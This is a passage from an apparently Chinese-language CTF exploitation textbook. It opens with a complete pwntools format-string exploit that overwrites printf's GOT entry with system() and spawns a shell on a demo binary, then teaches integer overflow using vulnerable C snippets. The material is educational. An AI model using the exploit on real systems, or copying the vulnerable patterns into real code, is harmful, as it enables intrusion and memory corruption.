gdb-peda$ p printf
$1 = {} 0xf7e26bf0 
获得 system() 的虚拟地址：
gdb-peda$ p system
$1 = {} 0xf7e17060 
好了，演示完怎样用手工的方式得到构造 exp 需要的信息，下面我们给出使用
pwntools 构造的完整漏洞利用代码：
361
3.1.1 格式化字符串漏洞
# -*- coding: utf-8 -*-
from pwn import *
elf = ELF('./a.out')
r = process('./a.out')
libc = ELF('/usr/lib32/libc.so.6')
# 计算偏移量
def exec_fmt(payload):
r.sendline(payload)
info = r.recv()
return info
auto = FmtStr(exec_fmt)
offset = auto.offset
# 获得 printf 的 GOT 地址
printf_got = elf.got['printf']
log.success("printf_got => {}".format(hex(printf_got)))
# 获得 printf 的虚拟地址
payload = p32(printf_got) + '%{}$s'.format(offset)
r.send(payload)
printf_addr = u32(r.recv()[4:8])
log.success("printf_addr => {}".format(hex(printf_addr)))
# 获得 system 的虚拟地址
system_addr = printf_addr - (libc.symbols['printf'] - libc.symbo
ls['system'])
log.success("system_addr => {}".format(hex(system_addr)))
payload = fmtstr_payload(offset, {printf_got : system_addr})
r.send(payload)
r.send('/bin/sh')
r.recv()
r.interactive()
362
3.1.1 格式化字符串漏洞
$ python2 exp.py
[*] '/home/firmy/Desktop/RE4B/a.out'
Arch: i386-32-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x8048000)
[+] Starting local process './a.out': pid 17375
[*] '/usr/lib32/libc.so.6'
Arch: i386-32-little
RELRO: Partial RELRO
Stack: Canary found
NX: NX enabled
PIE: PIE enabled
[*] Found format string offset: 4
[+] printf_got => 0x804a010
[+] printf_addr => 0xf7e26bf0
[+] system_addr => 0xf7e17060
[*] Switching to interactive mode
$ echo "hacked!"
hacked!
这样我们就获得了 shell，可以看到输出的信息和我们手工得到的信息完全相同。
扩展阅读
Exploiting Sudo format string vunerability CVE-2012-0809
练习
pwn NJCTF2017 pingme
writeup 在章节 6.1.2 中
363
3.1.2 整数溢出
3.1.2 整数溢出
什么是整数溢出
整数溢出
整数溢出示例
CTF 中的整数溢出
什么是整数溢出
简介
在 C 语言基础的章节中，我们介绍了 C 语言整数的基础知识，下面我们详细介绍
整数的安全问题。
由于整数在内存里面保存在一个固定长度的空间内，它能存储的最大值和最小值是
固定的，如果我们尝试去存储一个数，而这个数又大于这个固定的最大值时，就会
导致整数溢出。（x86-32 的数据模型是 ILP32，即整数（Int）、长整数（Long）
和指针（Pointer）都是 32 位。）
整数溢出的危害
如果一个整数用来计算一些敏感数值，如缓冲区大小或数值索引，就会产生潜在的
危险。通常情况下，整数溢出并没有改写额外的内存，不会直接导致任意代码执
行，但是它会导致栈溢出和堆溢出，而后两者都会导致任意代码执行。由于整数溢
出出现之后，很难被立即察觉，比较难用一个有效的方法去判断是否出现或者可能
出现整数溢出。
整数溢出
关于整数的异常情况主要有三种：
溢出
只有有符号数才会发生溢出。有符号数最高位表示符号，在两正或两负相
加时，有可能改变符号位的值，产生溢出
364
3.1.2 整数溢出
溢出标志 OF 可检测有符号数的溢出
回绕
无符号数 0-1 时会变成最大的数，如 1 字节的无符号数会变为 255 ，
而 255+1 会变成最小数 0 。
进位标志 CF 可检测无符号数的回绕
截断
将一个较大宽度的数存入一个宽度小的操作数中，高位发生截断
有符号整数溢出
上溢出
int i;
i = INT_MAX; // 2 147 483 647
i++;
printf("i = %d\n", i); // i = -2 147 483 648
下溢出
i = INT_MIN; // -2 147 483 648
i--;
printf("i = %d\n", i); // i = 2 147 483 647
无符号数回绕
涉及无符号数的计算永远不会溢出，因为不能用结果为无符号整数表示的结果值被
该类型可以表示的最大值加 1 之和取模减（reduced modulo）。因为回绕，一个无
符号整数表达式永远无法求出小于零的值。
使用下图直观地理解回绕，在轮上按顺时针方向将值递增产生的值紧挨着它：
365
3.1.2 整数溢出
unsigned int ui;
ui = UINT_MAX; // 在 x86-32 上为 4 294 967 295
ui++;
printf("ui = %u\n", ui); // ui = 0
ui = 0;
ui--;
printf("ui = %u\n", ui); // 在 x86-32 上，ui = 4 294 967 295
截断
加法截断：
0xffffffff + 0x00000001
= 0x0000000100000000 (long long)
= 0x00000000 (long)
乘法截断：
366
3.1.2 整数溢出
0x00123456 * 0x00654321
= 0x000007336BF94116 (long long)
= 0x6BF94116 (long)
整型提升和宽度溢出
整型提升是指当计算表达式中包含了不同宽度的操作数时，较小宽度的操作数会被
提升到和较大操作数一样的宽度，然后再进行计算。
示例：源码
#include
void main() {
int l;
short s;
char c;
l = 0xabcddcba;
s = l;
c = l;
printf("宽度溢出\n");
printf("l = 0x%x (%d bits)\n", l, sizeof(l) * 8);
printf("s = 0x%x (%d bits)\n", s, sizeof(s) * 8);
printf("c = 0x%x (%d bits)\n", c, sizeof(c) * 8);
printf("整型提升\n");
printf("s + c = 0x%x (%d bits)\n", s+c, sizeof(s+c) * 8);
}
$ ./a.out
宽度溢出
l = 0xabcddcba (32 bits)
s = 0xffffdcba (16 bits)
c = 0xffffffba (8 bits)
整型提升
s + c = 0xffffdc74 (32 bits)
367
3.1.2 整数溢出
使用 gdb 查看反汇编代码：
gdb-peda$ disassemble main
Dump of assembler code for function main:
0x0000056d : lea ecx,[esp+0x4]
0x00000571 : and esp,0xfffffff0
0x00000574 : push DWORD PTR [ecx-0x4]
0x00000577 : push ebp
0x00000578 : mov ebp,esp
0x0000057a : push ebx
0x0000057b : push ecx
0x0000057c : sub esp,0x10
0x0000057f : call 0x470 
0x00000584 : add ebx,0x1a7c
0x0000058a : mov DWORD PTR [ebp-0xc],0xabcddcba
0x00000591 : mov eax,DWORD PTR [ebp-0xc]
0x00000594 : mov WORD PTR [ebp-0xe],ax
0x00000598 : mov eax,DWORD PTR [ebp-0xc]
0x0000059b : mov BYTE PTR [ebp-0xf],al
0x0000059e : sub esp,0xc
0x000005a1 : lea eax,[ebx-0x1940]
0x000005a7 : push eax
0x000005a8 : call 0x400 
0x000005ad : add esp,0x10
0x000005b0 : sub esp,0x4
0x000005b3 : push 0x20
0x000005b5 : push DWORD PTR [ebp-0xc]
0x000005b8 : lea eax,[ebx-0x1933]
0x000005be : push eax
0x000005bf : call 0x3f0 
0x000005c4 : add esp,0x10
0x000005c7 : movsx eax,WORD PTR [ebp-0xe]
0x000005cb : sub esp,0x4
0x000005ce : push 0x10
0x000005d0 : push eax
0x000005d1 : lea eax,[ebx-0x191f]
0x000005d7 : push eax
0x000005d8 : call 0x3f0 
0x000005dd : add esp,0x10
0x000005e0 : movsx eax,BYTE PTR [ebp-0xf]
368
3.1.2 整数溢出
0x000005e4 : sub esp,0x4
0x000005e7 : push 0x8
0x000005e9 : push eax
0x000005ea : lea eax,[ebx-0x190b]
0x000005f0 : push eax
0x000005f1 : call 0x3f0 
0x000005f6 : add esp,0x10
0x000005f9 : sub esp,0xc
0x000005fc : lea eax,[ebx-0x18f7]
0x00000602 : push eax
0x00000603 : call 0x400 
0x00000608 : add esp,0x10
0x0000060b : movsx edx,WORD PTR [ebp-0xe]
0x0000060f : movsx eax,BYTE PTR [ebp-0xf]
0x00000613 : add eax,edx
0x00000615 : sub esp,0x4
0x00000618 : push 0x20
0x0000061a : push eax
0x0000061b : lea eax,[ebx-0x18ea]
0x00000621 : push eax
0x00000622 : call 0x3f0 
0x00000627 : add esp,0x10
0x0000062a : nop
0x0000062b : lea esp,[ebp-0x8]
0x0000062e : pop ecx
0x0000062f : pop ebx
0x00000630 : pop ebp
0x00000631 : lea esp,[ecx-0x4]
0x00000634 : ret
End of assembler dump.
在整数转换的过程中，有可能导致下面的错误：
损失值：转换为值的大小不能表示的一种类型
损失符号：从有符号类型转换为无符号类型，导致损失符号
漏洞多发函数
369
3.1.2 整数溢出
我们说过整数溢出要配合上其他类型的缺陷才能有用，下面的两个函数都有一个
size_t 类型的参数，常常被误用而产生整数溢出，接着就可能导致缓冲区溢出
漏洞。
#include 
void *memcpy(void *dest, const void *src, size_t n);
memcpy() 函数将 src 所指向的字符串中以 src 地址开始的前 n 个字节复
制到 dest 所指的数组中，并返回 dest 。
#include 
char *strncpy(char *dest, const char *src, size_t n);
strncpy() 函数从源 src 所指的内存地址的起始位置开始复制 n 个字节到
目标 dest 所指的内存地址的起始位置中。
两个函数中都有一个类型为 size_t 的参数，它是无符号整型的 sizeof 运算
符的结果。
typedef unsigned int size_t;
整数溢出示例
现在我们已经知道了整数溢出的原理和主要形式，下面我们先看几个简单示例，然
后实际操作利用一个整数溢出漏洞。
示例
示例一，整数转换：
370
3.1.2 整数溢出
char buf[80];
void vulnerable() {
int len = read_int_from_network();
char *p = read_string_from_network();
if (len > 80) {
error("length too large: bad dog, no cookie for you!");
return;
}
memcpy(buf, p, len);
}
这个例子的问题在于，如果攻击者给 len 赋于了一个负数，则可以绕过 if 语
句的检测，而执行到 memcpy() 的时候，由于第三个参数是 size_t 类型，负
数 len 会被转换为一个无符号整型，它可能是一个非常大的正数，从而复制了大
量的内容到 buf 中，引发了缓冲区溢出。
示例二，回绕和溢出：
void vulnerable() {
size_t len;
// int len;
char* buf;
len = read_int_from_network();
buf = malloc(len + 5);
read(fd, buf, len);
...
}
这个例子看似避开了缓冲区溢出的问题，但是如果 len 过大， len+5 有可能发
生回绕。比如说，在 x86-32 上，如果 len = 0xFFFFFFFF ，则 len+5 =
0x00000004 ，这时 malloc() 只分配了 4 字节的内存区域，然后在里面写入大
量的数据，缓冲区溢出也就发生了。（如果将 len 声明为有符号 int 类